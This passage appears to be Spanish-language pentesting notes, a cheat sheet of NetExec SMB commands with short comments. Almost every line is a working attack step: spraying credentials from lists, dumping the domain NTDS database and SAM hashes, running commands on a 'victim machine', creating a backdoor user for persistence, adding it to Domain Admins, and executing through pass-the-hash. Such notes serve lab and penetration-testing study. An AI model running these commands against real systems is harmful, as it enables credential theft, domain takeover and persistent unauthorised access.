...
❯ nxc smb ❮IP❯ -u 'user' -p 'password'  --shares    # Listar los recursos usando credenciales validas
❯ nxc smb ❮IP❯ --users                              # Listar usuarios en el SMB
❯ nxc smb ❮IP❯ -u users.txt -p ❮‘’❯  --shares       # Validar las credenciales y listar el recurso
❯ nxc smb ❮IP❯ -u ❮usuarios❯ -p ❮passwds❯ --spider <Dir> --regex .   # Ver todo el contenido del dir y sus subcarpetas 
...
❯ nxc smb ❮IP❯ -u ❮usuarios❯ -p ❮passwds❯ --ntds   # Extraer la DB de usuarios y passwds del dominio  

❯ nxc smb ❮IP❯ -u ❮usuarios❯ -p ❮passwds❯ -x "ipconfig"    # Ejecutar un comando en la maquina victima 
❯ nxc smb ❮IP❯ -u ❮usuarios❯ -p ❮passwds❯ -x "net user juan Password1 /add"    # Crear un usuario en la maquina victima para tener 'Persistencia' 
❯ nxc smb ❮IP❯ -u ❮usuarios❯ -p ❮passwds❯ -x "net group 'domain admins' juan /add"    # Agregar el usuario creado anteriormente al grupo de 'Admins'
❯ nxc smb ❮IP❯ -u <USER> -H "Hash" -x "ipconfig"    # Ejecutar comandos con 'PtH'

❯ nxc smb ❮IP❯ -u <‘USER’> -p <‘PASSWORD’> --sam    # Listar el hash del usuario administrador y del resto de usuarios, para aplicar 'PtH'. Si el hash termina en '089c0' es una cuenta deshabilitada.     
